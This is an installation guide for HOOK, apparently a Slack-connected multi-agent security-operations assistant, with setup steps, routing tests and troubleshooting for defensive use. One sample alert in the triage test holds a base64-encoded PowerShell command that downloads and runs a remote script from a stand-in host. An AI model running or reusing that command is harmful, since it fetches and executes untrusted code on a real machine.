# HOOK Installation Guide

**HOOK — Hunting, Orchestration & Operational Knowledge**
by PUNCH Cyber

A complete, start-to-finish guide to setting up HOOK on macOS. Written for junior developers — every command is explained, every gotcha is documented. If you follow this guide step by step, you will have a working multi-agent SOC assistant.

**Time estimate:** 30-45 minutes (most of it is Slack app setup)

---

## Architecture Overview

Before you start, understand what you're building:

```
Slack (#hook)
    ↓ messages
OpenClaw Gateway (runs on your Mac, manages agents + Slack connection)
    ↓ routes to
Coordinator Agent (decides which specialist handles the request)
    ↓ spawns
Specialist Agents (triage, OSINT, IR, threat intel, report writer)
    ↓ call
Enrichment APIs (VirusTotal, Censys, AbuseIPDB) + local tools (dig, whois, nmap)
```

OpenClaw is the platform. HOOK is the set of agents, configs, and pipelines that run on it. The agents execute shell commands on your Mac to call APIs and run tools — there's no Docker sandbox in this configuration.

---

## Prerequisites

### Accounts & API Keys (get these first)

You need four free API keys. Sign up before starting the install — approval can take a few minutes.

| Service | Sign Up | What you need | Free tier limits |
|---------|---------|---------------|------------------|
| **OpenAI** | https://platform.openai.com | API key with GPT-4.1 + GPT-5 access | Pay-as-you-go |
| **VirusTotal** | https://www.virustotal.com/gui/join-us | API key (Profile → API Key) | 4 requests/min |
| **Censys** | https://search.censys.io/register | API ID + API Secret (Account → API) | 250 queries/month |
| **AbuseIPDB** | https://www.abuseipdb.com/register | API key (User Account → API) | 1000 checks/day |

### Software

| Tool | Check | Install |
|------|-------|---------|
| macOS | — | Required (tested on Mac Studio, Apple Silicon) |
| Homebrew | `brew --version` | https://brew.sh |
| Node.js 18+ | `node --version` | `brew install node` |
| Git | `git --version` | `brew install git` |
| Docker Desktop | `docker --version` | https://docker.com (optional — for future sandboxing) |

### Slack

- A Slack workspace where you have permission to create apps
- You'll create a dedicated channel (`#hook`) and a bot app

---

## Step 1: Install OpenClaw

```bash
npm install -g @openclaw/openclaw
```

Verify:
```bash
openclaw --version
# Should show: OpenClaw 2026.x.x
```

If this is your first time, run the onboarding wizard:
```bash
openclaw onboard
```

This creates `~/.openclaw/` and sets up your initial config. When prompted:
- **Model provider:** OpenAI
- **API key:** Your OpenAI API key
- **Gateway bind:** local (127.0.0.1)

> **Why OpenClaw?** It's an AI agent orchestration platform that handles Slack integration, agent routing, subagent spawning, and tool execution. HOOK provides the agent configurations that make it a SOC assistant.

---

## Step 2: Install Security Tools

HOOK's agents use command-line tools for DNS lookups, WHOIS queries, network scanning, and JSON parsing. Install them:

```bash
brew install jq bind nmap whois
```

Verify all four:
```bash
jq --version                      # jq-1.7+
dig -v 2>&1 | head -1             # DiG 9.x
nmap --version 2>&1 | head -1     # Nmap 7.x
whois example.com | head -3       # Should return WHOIS data (whois has no --version flag)
```

> **What each tool does:**
> - `jq` — Parse JSON from API responses
> - `dig` — DNS lookups (A records, reverse DNS, MX, TXT)
> - `whois` — Domain/IP ownership lookups
> - `nmap` — Port scanning during incident response

---

## Step 3: Clone HOOK Repository

```bash
cd ~/PROJECTS    # or wherever you keep repos
git clone git@github.com:bwrisley/hook.git
cd hook
```

Verify the structure:
```bash
ls workspaces/
# Should show: coordinator/  incident-responder/  osint-researcher/  report-writer/  threat-intel/  triage-analyst/

ls pipelines/
# Should show: alert-to-report.yaml  batch-ioc-check.yaml  ioc-enrich-domain.yaml  ioc-enrich-ip.yaml

ls scripts/
# Should show: enrich-batch.sh  enrich-domain.sh  enrich-hash.sh  enrich-ip.sh  extract-iocs.sh  format-report.sh
```

Make scripts executable:
```bash
chmod +x scripts/*.sh config/build.sh
```

---

## Step 4: Configure OpenClaw for HOOK

### Option A: Automated Setup (recommended)

```bash
./install/setup.sh
```

This will:
- Back up your existing config
- Copy the HOOK template to `~/.openclaw/openclaw.json`
- Replace workspace paths automatically
- Prompt for API keys interactively
- Install security tools if missing
- Validate the result

After it finishes, you still need to add Slack tokens (Step 5).

### Option B: Manual Setup

```bash
# Back up existing config
cp ~/.openclaw/openclaw.json ~/.openclaw/openclaw.json.backup 2>/dev/null

# Copy template
cp config/openclaw.json.template ~/.openclaw/openclaw.json

# Replace workspace paths (adjust the path to where you cloned hook)
HOOK_PATH="$HOME/PROJECTS/hook"
sed -i '' "s|HOOK_REPO_PATH|$HOOK_PATH|g" ~/.openclaw/openclaw.json

# Verify replacement
grep -c "HOOK_REPO_PATH" ~/.openclaw/openclaw.json
# Should return 0
```

Now edit `~/.openclaw/openclaw.json` and replace the API key placeholders:

```
YOUR_VIRUSTOTAL_API_KEY    → your VT key
YOUR_CENSYS_API_ID         → your Censys API ID
YOUR_CENSYS_API_SECRET     → your Censys secret
YOUR_ABUSEIPDB_API_KEY     → your AbuseIPDB key
```

---

## Step 5: Create Slack App

This is the longest step. Follow each sub-step exactly.

### 5a: Create the App

1. Go to https://api.slack.com/apps
2. Click **Create New App** → **From scratch**
3. App Name: `HOOK`
4. Pick your workspace
5. Click **Create App**

### 5b: Enable Socket Mode

Socket Mode lets HOOK connect to Slack without a public URL.

1. Left sidebar → **Socket Mode**
2. Toggle **Enable Socket Mode** → ON
3. Create an app-level token:
   - Token Name: `hook-socket`
   - Scope: `connections:write`
   - Click **Generate**
4. **Copy the `xapp-...` token** — this is your `appToken`

### 5c: Add Bot Permissions

1. Left sidebar → **OAuth & Permissions**
2. Scroll to **Bot Token Scopes**
3. Add these scopes (click "Add an OAuth Scope" for each):

| Scope | Why HOOK needs it |
|-------|-------------------|
| `app_mentions:read` | Detect when someone @mentions HOOK |
| `chat:write` | Send responses and agent results |
| `channels:history` | Read messages in public channels |
| `channels:read` | List and identify channels |
| `groups:history` | Read messages in private channels |
| `groups:read` | List private channels |
| `im:history` | Read direct messages |
| `im:read` | Access DM channels |
| `im:write` | Send direct messages |
| `users:read` | Identify who is messaging |

### 5d: Install App to Workspace

1. Scroll to the top of **OAuth & Permissions**
2. Click **Install to Workspace**
3. Click **Allow**
4. **Copy the `xoxb-...` token** — this is your `botToken`

### 5e: Enable Events

1. Left sidebar → **Event Subscriptions**
2. Toggle **Enable Events** → ON
3. Under **Subscribe to bot events**, add:
   - `app_mention`
   - `message.channels`
   - `message.groups`
   - `message.im`
4. Click **Save Changes**

### 5f: Add Tokens to Config

Edit `~/.openclaw/openclaw.json` and replace the Slack token placeholders:

```
xoxb-YOUR-BOT-TOKEN   → your actual xoxb-... bot token
xapp-YOUR-APP-TOKEN    → your actual xapp-... app token
```

### 5g: Create Test Channel

1. In Slack, create a channel: `#hook` (private recommended)
2. Invite the bot: type `/invite @HOOK` in the channel

---

## Step 6: Start and Verify

### Start the gateway

```bash
openclaw gateway install
openclaw gateway start
```

> **If you see "Gateway service not loaded":** Run `openclaw gateway install` first, then `openclaw gateway start`.

### Verify agents are loaded

```bash
openclaw agents list --bindings
```

Expected output — all 6 agents listed:
```
Agents:
- coordinator (default)
  Workspace: ~/PROJECTS/hook/workspaces/coordinator
  Model: openai/gpt-4.1
- triage-analyst
  Workspace: ~/PROJECTS/hook/workspaces/triage-analyst
  Model: openai/gpt-4.1
- osint-researcher
  Workspace: ~/PROJECTS/hook/workspaces/osint-researcher
  Model: openai/gpt-4.1
- incident-responder
  Workspace: ~/PROJECTS/hook/workspaces/incident-responder
  Model: openai/gpt-5
- threat-intel
  Workspace: ~/PROJECTS/hook/workspaces/threat-intel
  Model: openai/gpt-5
- report-writer
  Workspace: ~/PROJECTS/hook/workspaces/report-writer
  Model: openai/gpt-4.1
```

### Check Slack connection

```bash
openclaw channels status --probe
```

### Run health check

Before testing in Slack, validate the full environment:

```bash
./scripts/health-check.sh
```

This checks all dependencies, tools, config, API connectivity, and agent workspaces in one pass. Fix any failures before proceeding.

### Validate config structure

```bash
./scripts/validate-config.sh
```

This compares your live config against the template and checks for placeholder remnants, missing agents, workspace path issues, binding configuration, and known OpenClaw schema pitfalls. Fix any [FAIL] items before proceeding.

### First test

In `#hook`, send:
```
@HOOK Hello, are you online?
```

The coordinator should respond. If it does — OpenClaw, Slack, and the coordinator agent are all working.

---

## Step 7: Test Agent Routing

These tests verify that the coordinator routes to the correct specialist.

### Test: OSINT routing (bare IOC, no alert)

```
@HOOK Enrich this IP: 8.8.8.8
```

**Expected:** Coordinator spawns `osint-researcher`, which runs VT + Censys + AbuseIPDB lookups and announces results. The coordinator should NOT enrich the IP itself.

### Test: Triage routing (alert with IOCs)

```
@HOOK Triage this alert:

AlertName: Suspicious PowerShell Command
Severity: High
CompromisedEntity: WKSTN-FIN-042
Entities:
  - Host: WKSTN-FIN-042 (10.20.30.42)
  - Process: powershell.exe -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBzAHQAYQBnAGUAcgAuAHAAcwAxACcAKQA=
  - IP: 45.77.65.211 (destination)
```

**Expected:** Coordinator spawns `triage-analyst` (NOT osint-researcher). Triage decodes the base64, provides a verdict (TP/FP/Suspicious), and maps to MITRE ATT&CK.

### Test: Incident response routing

```
@HOOK We have an active incident — Cobalt Strike beacon on WKSTN-042 beaconing to 45.77.65.211. What do we do?
```

**Expected:** Coordinator spawns `incident-responder` (not triage, not OSINT). IR provides NIST 800-61 containment steps.

> **Routing priority:** Active incident → Triage → OSINT → Threat Intel → Report Writer. If the coordinator routes to the wrong agent, review the decision tree in `workspaces/coordinator/SOUL.md`.

---

## Step 8: Test Enrichment APIs

Verify all three enrichment APIs work outside of HOOK:

```bash
# VirusTotal
curl -s "https://www.virustotal.com/api/v3/ip_addresses/8.8.8.8" \
  -H "x-apikey: YOUR_VT_KEY" | jq '.data.attributes.last_analysis_stats'

# Censys
curl -s -u "YOUR_CENSYS_ID:YOUR_CENSYS_SECRET" \
  "https://search.censys.io/api/v2/hosts/8.8.8.8" | jq '.result.services | length'

# AbuseIPDB
curl -s -G "https://api.abuseipdb.com/api/v2/check" \
  -d "ipAddress=8.8.8.8" -d "maxAgeInDays=90" \
  -H "Key: YOUR_ABUSEIPDB_KEY" \
  -H "Accept: application/json" | jq '.data.abuseConfidenceScore'
```

All three should return data. If any fail, double-check the API key in `~/.openclaw/openclaw.json`.

---

## Step 9: Test Enrichment Scripts

Verify the standalone scripts work:

```bash
cd ~/PROJECTS/hook

# Single IP enrichment
./scripts/enrich-ip.sh 8.8.8.8 | jq '.risk'
# Expected: "LOW"

# IOC extraction from text
echo "Suspicious connection from 45.77.65.211 to evil-update.com" \
  | ./scripts/extract-iocs.sh | jq '.counts'
# Expected: {"ips": 1, "domains": 1, "hashes": 0, "total": 2}
```

---

## Step 10: Run Full Smoke Test

Use Operation Frozen Ledger (`tests/scenarios/operation-frozen-ledger.md`) — a simulated multi-stage attack against a financial services firm.

### Using the test runner

The test runner prints all six test prompts with expected behaviors:

```bash
# Print prompts for manual copy-paste to Slack
./tests/run-frozen-ledger.sh

# Post prompts directly to Slack (interactive, waits between tests)
./tests/run-frozen-ledger.sh --post

# After testing, create a results capture template
./tests/run-frozen-ledger.sh --log
```

### Manual full chain test

Start with the full chain test in `#hook`:

```
@HOOK We just got this Sentinel alert. Please investigate fully — triage it, enrich all IOCs, give me IR guidance, and write a summary for management.

AlertName: Multi-stage Attack Detected
Severity: Critical
Entities:
  - Host: WKSTN-FIN-042 (10.20.30.42)
  - Account: jsmith@contoso.com
  - C2 IP: 45.77.65.211
  - Domain: update-check.finance-portal.com
  - Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
  - Lateral Movement Target: DC-01 (10.20.30.10)
```

**Expected chain:**
1. Coordinator spawns `triage-analyst` first
2. After triage announces back → coordinator spawns `osint-researcher` with triage findings
3. After OSINT announces back → coordinator spawns `report-writer` or `incident-responder`
4. Context passes between steps (prior findings included in each spawn)

Each subagent takes 30-120 seconds. The full chain may take 5-10 minutes.

See `tests/scenarios/operation-frozen-ledger.md` for additional individual agent tests.

---

## Troubleshooting

### Gateway won't start

```bash
# Check config validity
openclaw doctor

# Common fix: remove unknown keys
openclaw doctor --fix

# Force reinstall the gateway service
openclaw gateway install --force
openclaw gateway start
```

### "Config invalid" / "Unrecognized key"

OpenClaw's JSON schema is extremely strict. It rejects any key not in its schema — even keys that seem logical. Known invalid keys:

| Invalid key | Where it seems logical | Why it fails |
|---|---|---|
| `auth` (top-level) | Authentication config | Managed by `openclaw configure`, not openclaw.json |
| `compaction` (under agents.defaults) | Context management | Not in agent schema |
| `tools.lobster` | Enable Lobster tool | Lobster auto-detects via PATH, no config needed |
| `description` (under agent entries) | Agent description | Not in agent schema |
| `allowedCommands` / `blockedCommands` | Tool restrictions | Not in schema — use `tools.allow`/`tools.deny` |
| `session.dmScope` | DM scoping | Removed from schema in 2026.2.x |
| `gateway.bind` | Bind address | Removed from schema in 2026.2.x |
| `gateway.controlUi: true` | Enable control UI | Must be object: `{"enabled": true}`, not boolean |
| `channels.slack.streaming` | Enable streaming | Replaced by `nativeStreaming` |

**Fix:** Remove the offending key, or run `openclaw doctor --fix`.

### Slack not responding

```bash
# Check gateway is running
openclaw gateway status

# Check Slack connection specifically
openclaw channels status --probe

# View recent gateway logs
openclaw gateway logs --tail 50
```

Common issues:
- **Bot not invited to channel:** Type `/invite @HOOK` in `#hook`
- **Wrong token type:** `botToken` starts with `xoxb-`, `appToken` starts with `xapp-` — don't swap them
- **Socket Mode not enabled:** Slack app settings → Socket Mode → must be ON
- **Events not subscribed:** Must have `app_mention`, `message.channels`, `message.groups`, `message.im`

### API calls failing / agent not enriching

Common issues:
- **Agent uses `web_fetch` instead of `exec`:** Known LLM behavior. TOOLS.md says "use exec, NOT web_fetch" but agents sometimes ignore it. If it happens consistently, add stronger language to the agent's SOUL.md.
- **API key not in env:** Verify the `env` block in `~/.openclaw/openclaw.json` has all four keys and `"shellEnv": { "enabled": true }` is present.
- **Rate limited:** VT free tier allows 4 requests/minute. Batch enrichments will hit this. Add delays or upgrade your plan.

### Coordinator routes to wrong agent

The coordinator's routing logic is in `workspaces/coordinator/SOUL.md`. The rules:

1. **Alert with IOCs → triage-analyst** (not OSINT). Alert context present = triage first.
2. **Bare IOC, no alert → osint-researcher** (not triage). No alert data = pure enrichment.
3. **"What do we do" / active incident → incident-responder** (not triage, not OSINT).
4. **Coordinator doing enrichment itself → bug.** It should NEVER run curl/API calls directly.

### Subagent never announces back

```bash
# In Slack:
/subagents list

# In terminal:
openclaw gateway logs --tail 100 | grep -i "error\|subagent\|spawn"
```

Common causes: `runTimeoutSeconds` too low, API timeout inside subagent, model rate limit.

### "Gateway service not loaded"

```bash
openclaw gateway install
openclaw gateway start
```

If still failing:
```bash
launchctl bootstrap gui/$UID ~/Library/LaunchAgents/ai.openclaw.gateway.plist
```

---

## File Reference

| File | Purpose | When to edit |
|------|---------|--------------|
| `~/.openclaw/openclaw.json` | Live config (API keys, agents, Slack tokens) | During setup, when adding features |
| `workspaces/*/SOUL.md` | Agent personality, routing rules, capabilities | When tuning agent behavior |
| `workspaces/*/TOOLS.md` | Tool instructions, API call templates, enrichment commands | When adding new tools or APIs |
| `config/openclaw.json.template` | Template for fresh installs (uses placeholders) | When changing agent config structure |
| `pipelines/*.yaml` | Lobster deterministic workflows | When adding automated pipelines |
| `scripts/*.sh` | Enrichment helper scripts | When adding new enrichment sources |
| `scripts/health-check.sh` | Environment validation (tools, APIs, workspaces) | When adding new dependencies |
| `scripts/validate-config.sh` | Config structure validation (drift, schema, bindings) | When changing config template |
| `tests/run-frozen-ledger.sh` | Smoke test runner (print, post to Slack, log results) | When adding test scenarios |
| `tests/scenarios/*.md` | Test prompts and expected behaviors | When adding test cases |

---

## Optional: Install Lobster (Deterministic Pipelines)

Lobster lets HOOK run multi-step enrichment without LLM token cost. Optional — agent-based chains work without it.

```bash
npm install -g @openclaw/lobster
which lobster    # Should return a path
```

Restart the gateway after installing — Lobster is auto-detected when on PATH:
```bash
openclaw gateway stop
openclaw gateway install --force
openclaw gateway start
```

See `docs/PIPELINES.md` for usage.

---

## Optional: Custom Docker Image (Future)

A Dockerfile is provided at `config/Dockerfile.hook` for future Docker sandboxing. NOT required for the current setup. See the Dockerfile comments for details.

---

## What's Next

After successful setup:
1. Run all six Frozen Ledger tests: `./tests/run-frozen-ledger.sh`
2. Customize `config/USER.md.template` -- copy to each workspace as `USER.md` with your org details
3. Experiment with Lobster pipelines for batch IOC processing
4. Share `#hook` with your SOC team for feedback
5. Connect to a live SIEM (Sentinel API) for real alert ingestion
